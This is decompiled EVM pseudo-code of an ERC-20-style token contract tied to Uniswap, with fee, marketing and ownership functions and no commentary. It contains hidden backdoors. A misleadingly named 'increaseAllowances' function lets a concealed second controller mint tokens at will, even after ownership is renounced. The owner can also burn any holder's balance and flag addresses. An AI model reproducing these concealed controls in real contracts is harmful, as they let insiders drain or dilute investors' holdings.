contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
address owner;
mapping of uint256 _balances;
mapping of uint256 allowance;
uint256 _totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address uniswapV2RouterAddress; offset 8
uint8 stor7; offset 160
uint128 stor7; offset 160
address uniswapV2PairAddress;
address deadWalletAddress;
address marketAddress;
mapping of uint8 stor10;
uint256 stor11;
mapping of uint8 stor12;
uint256 stor13;
uint256 stor14;
uint256 stor15;
uint256 stor16;
uint256 totalFees;
uint256 launchedAt;
uint256 stor19;
uint256 stor21;
uint8 stor22;
address sub_7127e24fAddress; offset 8
mapping of uint8 stor23;
address stor24;

function name() {
    return name[0 len name.length]
}

function totalFees() {
    return totalFees
}

function uniswapV2Router() {
    return uniswapV2RouterAddress
}

function totalSupply() {
    return _totalSupply
}

function decimals() {
    return decimals
}

function sub_34a4f576(?) {
    require calldata.size - 4 >= 32
    return bool(stor12[arg1])
}

function _totalSupply() {
    return _totalSupply
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function _balances(address arg1) {
    require calldata.size - 4 >= 32
    return _balances[arg1]
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return _balances[address(arg1)]
}

function sub_7127e24f(?) {
    return sub_7127e24fAddress
}

function market() {
    return marketAddress
}

function deadWallet() {
    return deadWalletAddress
}

function owner() {
    return owner
}

function sub_8e16d7fa(?) {
    return bool(uint8(stor7.field_160))
}

function symbol() {
    return symbol[0 len symbol.length]
}

function sub_a6c152b7(?) {
    require calldata.size - 4 >= 32
    return bool(stor10[arg1])
}

function launchedAt() {
    return launchedAt
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function sub_ba440db1(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor22 = uint8(arg1)
}

function setLunchTime(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor19 = arg1
}

function setmarket(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    marketAddress = arg1
}

function sub_28834596(?) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor13 = arg1
    stor14 = arg2
}

function setswapTokensAtAmount(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor21 = arg1
}

function sub_dac83d09(?) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor12[address(arg1)] = uint8(arg2)
}

function setLswapping(bool arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(96, 0, stor7.field_160) = Mask(96, 0, arg1)
}

function isbookAddress(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor10[address(arg1)] = uint8(arg2)
}

function setExcludedFromFees(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor23[address(arg1)] = uint8(arg2)
}

function setMaxTxPercent(uint256 arg1) {
    require calldata.size - 4 >= 32
    if stor24 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x654f776e61626c653a2063616c6c6572206973206e6f7420746865206572657265,
                    mem[197 len 31]
    stor11 = 100 * arg1
}

function setLiquiditFee(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor15 = arg1
    if stor15 + stor16 < stor15:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x2e536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61,
                    mem[200 len 28]
    totalFees = stor15 + stor16
}

function setMarketingFee(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor16 = arg1
    if stor15 + stor16 < stor15:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x2e536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61,
                    mem[200 len 28]
    totalFees = stor15 + stor16
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x654f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_8fda4ed8(?) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6545524332303a206275726e2066726f6d20746865207a65726f20616464726573,
                    mem[197 len 31]
    if 100 * arg2 > _balances[address(arg1)]:
        revert with 0, 32, 34, 0x7345524332303a206275726e20616d6f756e7420657863656564732062616c616e63, mem[162 len 30], mem[222 len 2]
    _balances[address(arg1)] += -100 * arg2
    if 100 * arg2 > _totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    _totalSupply += -100 * arg2
    emit Transfer((100 * arg2), arg1, 0);
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowances(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if stor24 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x654f776e61626c653a2063616c6c6572206973206e6f7420746865206572657265,
                    mem[197 len 31]
    if _totalSupply + (100 * arg2) < _totalSupply:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x2e536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61,
                    mem[200 len 28]
    _totalSupply += 100 * arg2
    if _balances[address(arg1)] + (100 * arg2) < _balances[address(arg1)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x2e536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61,
                    mem[200 len 28]
    _balances[address(arg1)] += 100 * arg2
    emit Transfer((100 * arg2), 0, arg1);
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x2e536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function sub_2de56fd2(?) payable {
    mem[64] = 96
    require not msg.value
    require calldata.size - 4 >= 64
    require cd[4] <= 4294967296
    require cd[4] + 36 <= calldata.size
    require ('cd', 4).length <= 4294967296 and cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size
    idx = 0
    while idx < ('cd', 4).length:
        _17 = mem[64]
        mem[64] = mem[64] + 96
        mem[_17] = 38
        mem[_17 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
        mem[32] = 1
        if cd[36] > _balances[address(msg.sender)]:
            _19 = mem[64]
            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[mem[64] + 4] = 32
            mem[mem[64] + 36] = 38
            idx = 0
            while idx < 38:
                mem[_19 + idx + 68] = mem[_17 + idx + 32]
                idx = idx + 32
                continue 
            mem[_19 + 100] = mem[_19 + 126 len 6]
            revert with memory
              from mem[64]
               len _19 + -mem[64] + 132
        _balances[address(msg.sender)] -= cd[36]
        if _balances[address(cd[((32 * idx) + cd[4] + 36)])] + cd[36] < _balances[address(cd[((32 * idx) + cd[4] + 36)])]:
            revert with 0, 32, 36, 0x2e536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[mem[64] + 104 len 28]
        mem[0] = address(cd[((32 * idx) + cd[4] + 36)])
        mem[32] = 1
        _balances[address(cd[((32 * idx) + cd[4] + 36)])] += cd[36]
        mem[mem[64]] = cd[36]
        emit Transfer(cd[36], msg.sender, address(cd[((32 * idx) + cd[4] + 36)]));
        idx = idx + 1
        continue 
}



}
